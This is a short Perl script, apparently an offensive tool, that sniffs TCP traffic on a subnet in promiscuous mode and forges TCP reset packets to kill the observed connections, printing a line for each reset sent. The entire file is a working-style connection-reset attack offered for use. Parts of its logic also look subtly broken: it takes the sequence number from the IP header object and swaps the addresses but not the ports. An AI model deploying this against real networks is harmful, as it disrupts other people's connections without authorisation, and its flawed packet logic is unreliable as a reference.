#!/usr/bin/perl

# Load modules
use Net::PcapUtils;
use NetPacket::Ethernet qw(:strip);
use NetPacket::TCP qw( RST );
use NetPacket::IP qw(:strip);
use Net::RawIP;

# Are you r00t?
if ( $> != 0 ) {
    die "You need EUID 0 to use this tool!\n\n";
}

# Start sniffin in promisc mode
Net::PcapUtils::loop(
    \&sniffit,
    Promisc => 1,
    FILTER  => 'tcp and net 10.0.0.0/24',
    DEV     => 'lo'
);

# Callback

sub sniffit {
    my ( $args, $header, $packet ) = @_;
    $ip  = NetPacket::IP->decode( eth_strip($packet) );
    $tcp = NetPacket::TCP->decode( $ip->{data} );
	
	if ($tcp->{flags} == RST){ return;}

	$packet = new Net::RawIP;

    $packet->set(
        {
            ip => {
                saddr => $ip->{dest_ip},
                daddr => $ip->{src_ip}
            },
            tcp => {
                dest => $tcp->{dest_port},
                source   => $tcp->{src_port},
                rst    => 1,
                seq    => $ip->{acknum},
                data   => 'I am a fake! =)'
            }
        }
    );

    $packet->send( 0, 1 );

    print "Reset send $ip->{dest_ip}:$tcp->{dest_port} --> $ip->{src_ip}:$tcp->{src_port}\n";
}

